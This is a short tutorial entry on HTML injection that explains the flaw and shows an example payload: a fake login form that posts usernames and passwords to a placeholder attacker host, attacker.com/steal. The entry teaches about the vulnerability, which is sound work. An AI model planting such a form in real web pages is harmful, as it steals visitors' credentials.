# Vulnerabilities

### htmli

HTML Injection (HTMLi) is a vulnerability that occurs when an attacker is able to inject HTML code into a web page by exploiting a weakness in the input validation process. This can happen, for example, if a web application does not properly validate user input or if it allows users to submit data that includes HTML tags that can be executed on the page.  
  
Let's say there is a vulnerable web page that allows users to submit comments, which are then displayed on the page without proper validation. An attacker could submit a comment that includes a ```<form>``` tag that is used to collect sensitive information from users, such as their login credentials.  
Here is an example of what the injected HTML code might look like:
```html
<p>Thank you for visiting our website. Please login to continue:</p>
<form method="post" action="http://attacker.com/steal">
  <label>Username:</label>
  <input type="text" name="username"><br>
  <label>Password:</label>
  <input type="password" name="password"><br>
  <input type="submit" value="Login">
</form>
```

In this example, the attacker has injected a ```<form>``` tag that looks like a legitimate login form. The form is set up to submit the entered username and password to the attacker's website (http://attacker.com/steal) when the user clicks the "Login" button.  

When the user views the page and enters their login credentials, they will unknowingly submit them to the attacker's website instead of the legitimate website. The attacker can then use the stolen credentials to access the victim's account and carry out further attacks.
